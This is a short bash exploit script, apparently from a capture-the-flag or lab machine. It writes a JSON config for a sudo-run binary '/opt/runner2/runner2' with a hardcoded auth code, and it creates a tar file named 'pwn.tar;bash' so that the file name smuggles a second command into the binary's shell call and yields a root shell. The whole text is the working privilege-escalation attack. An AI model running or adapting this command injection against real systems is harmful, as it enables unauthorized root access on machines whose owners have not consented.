#!/bin/bash

cd /dev/shm
json='{
    "run": {
        "action": "install",
        "role_file": "/dev/shm/pwn.tar;bash"
    },
    "auth_code": "UHI75GHINKOP"
}'
echo "$json" > pwn.json
touch pwn
tar -cf 'pwn.tar;bash' pwn
rm pwn
sudo /opt/runner2/runner2 pwn.json
